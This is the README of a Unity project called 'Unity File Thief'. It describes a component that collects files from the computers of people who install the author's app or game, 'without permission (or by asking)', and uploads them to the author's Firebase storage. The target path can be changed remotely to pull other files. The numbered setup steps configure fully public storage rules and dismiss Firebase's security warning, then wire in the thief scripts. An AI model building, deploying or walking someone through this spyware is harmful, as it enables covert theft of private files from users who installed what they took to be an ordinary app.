# Unity File Thief
Capture the files of users who installed the Application or Game you created in Unity from an address on their computers without permission (or by asking) and store them on the cloud (Firebase). After collecting the file from the user, you can change the path via Firebase and pull different files.  


## Content
- [How to Use](#how-to-use)
- [Basic Step by Step - Setup](#set-up)

<br>

## How to Use
Watch the Usage - https://youtu.be/q9tfqz6c1ss
<br>
<br>



## Set Up
&nbsp;&nbsp;1- Open your new Unity Project on Unity Hub   
<br>
<br>
**🛠️ SET FIREBASE REALTIME DATABASE & STORAGE FOR UNITY 🛠️**   
   
&nbsp;&nbsp;2- Go to : https://console.firebase.google.com/ . If you dont have any account, Sing Up   
&nbsp;&nbsp;3- Add new Project on Firebase Console (Don't need to enable "Google Analytics")     
&nbsp;&nbsp;4- Add the application to be used in the project panel you opened as Unity   
   
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://github.com/SabriACUN/Unity-File-Thief/assets/96339137/37fc2ca2-5789-4f6f-9de2-b81412b0fee8" width="250"/>

&nbsp;&nbsp;5- Choose the Register Type for Operating System (recommend : Android)   
&nbsp;&nbsp;6- Fill the first blank (com.company.appname) [ !! Not important what you write, Write according to the format ]   
&nbsp;&nbsp;7- Don't download "config file" for now. Next Button !   
&nbsp;&nbsp;8- Download Firebase Unity SDK (Zip) and Continue to Console.   
&nbsp;&nbsp;9- Open Sidebar ( If its closed )   
&nbsp;&nbsp;&nbsp;&nbsp;· Under the "Product Categories > Build > Storeage". Click "Get Started" 
&nbsp;&nbsp;&nbsp;&nbsp;· Start in production mode.   
10- Under the "Storage" text, select Rules. Delete the texts of Rules File and Copy and Paste that Rule : 
<pre>
rules_version ='2';  
service firebase.storage{  
  match /b/{bucket}/o {  
    match /{allPaths=**} {  
      allow read, write:if true;  
    }  
  }  
}  
</pre>
··· For NOW warning not important "Your security rules are defined as public, so anyone can steal, modify, or delete data in your database." ···    
11- Go to Sidebar and open Build again. Choose Realtime Database.   
&nbsp;&nbsp;&nbsp;&nbsp;· Create Database   
&nbsp;&nbsp;&nbsp;&nbsp;· You can open in Test Mode.   
&nbsp;&nbsp;&nbsp;&nbsp;· Add a new var.    
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; yol  :   "path"   
12- In the Sidebar there is a Settings Button. Click on it. Choose "Project Settings"   
&nbsp;&nbsp;&nbsp;&nbsp;· "General > Your apps" Download "google-services"   
<br>
<br>
**🛠️ SET UNITY FOR FIREBASE 🛠️** 
<br>
13- Go to Unity. Create a new folder. Name of the folder should be "StreamingAssets"  not with (") - (NAME IS IMPORTANT)   
&nbsp;&nbsp;&nbsp;&nbsp;·Add config file to that folder (google-services)   
14- Extract the Firebase SDK zip and hold FirebaseStorage.unitypackages & FirebaseDatabase.unitypackage and drop to project panel on the Unity. and Import   
15- Create new GameObject and add fileThieff.cs & takeString.cs to your GameObject.    
[ -- For logs and errors that may be encountered, the log printing system is included in the codes, so you can delete it if you want or assign the necessary texts to the desired places as a reference. -- ]  
<br>
<br>

**🛠️ SET THE SCRIPT FOR YOUR OWN DATABASE 🛠️**   
<br>
16- Go to Firebase Project > Storage. Copy Url which starts with gs (example ->  gs://file-thief.appspot.com )   
17- Turn to our script. Find that code line :   
<pre>
"StorageReference storageRef = storage.GetReferenceFromUrl("gs://file-thied.appspot.com/").Child(storagePath);" 
</pre>
&nbsp;&nbsp;&nbsp;&nbsp;· Delete that part  ""gs://file-thied.appspot.com/"" and paste your Url.     
18- Go to Editor and Set Referances for all scripts in Inspector   

**Its Ready to Use !**
- [How to Use](#how-to-use)
